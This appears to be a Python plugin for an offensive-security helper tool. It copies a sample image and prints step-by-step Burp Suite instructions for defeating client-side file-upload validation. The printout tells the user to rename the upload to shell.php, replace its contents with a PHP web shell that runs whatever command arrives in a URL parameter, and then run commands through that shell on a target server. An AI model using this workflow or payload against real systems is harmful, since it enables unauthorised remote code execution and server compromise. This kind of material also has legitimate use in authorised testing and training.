from pathlib import Path
import random
import shutil

from core.paths import get_images_dir


def run(data, cred, args):
    # ---------- ANSI ----------
    G = "\033[92m"
    C = "\033[96m"
    B = "\033[94m"
    Y = "\033[93m"
    R = "\033[91m"
    M = "\033[95m"
    W = "\033[0m"
    BOLD = "\033[1m"

    images_dir = get_images_dir()

    image = images_dir / f"image{random.randint(1, 9)}.jpg"
    destination = Path.cwd() / image.name

    shutil.copy2(image, destination)

    # ---------- HEADER ----------
    print(f"\n{B}┌── {BOLD}CLIENT-SIDE UPLOAD BYPASS{W}{B} ───────────────────────────┐{W}")
    print(f"{B}│{W}  {B}Technique:{W} Client-side validation bypass{' ' * 14}{B}│{W}")
    print(f"{B}│{W}  {B}Image:{W}     {C}{image.name:<43}{W}{B}│{W}")
    print(f"{B}│{W}  {B}Saved To:{W}  {C}{destination}{W}")
    print(f"{B}└────────────────────────────────────────────────────────┘{W}")

    print(f"\n{B}[{W}{G}+{W}{B}]{W} Image copied successfully.\n")

    print(f"{B}┌── {BOLD}BURP WORKFLOW{W}{B} ────────────────────────────────────────┐{W}")

    print(f"{B}│{W} {Y}1.{W} Upload {C}{image.name}{W}")
    print(f"{B}│{W} {Y}2.{W} Intercept the request in {C}Burp Suite{W}")
    print(f"{B}│{W} {Y}3.{W} Change:")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {Y}filename=\"{image.name}\"{W}")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {W}to")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {Y}filename=\"shell.php\"{W}")
    print(f"{B}│{W}")
    print(f"{B}│{W} {Y}4.{W} Replace the image bytes with:")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {Y}<?php system($_GET['cmd']); ?>{W}")
    print(f"{B}│{W}")
    print(f"{B}│{W} {Y}5.{W} Forward the request.")
    print(f"{B}│{W}")
    print(f"{B}│{W} {Y}6.{W} Browse to:")
    print(f"{B}│{W}")
    print(f"{B}│{W}    {M}http://<TARGET>/uploads/shell.php?cmd=id{W}")
    print(f"{B}└──────────────────────────────────────────────────────────────┘{W}")

    print(f"\n{B}[{W}{Y}*{W}{B}]{W} {BOLD}NOTE{W}")
    print(f"{B}  └── {W}Only works when upload validation is performed {Y}entirely on the client side{W}.")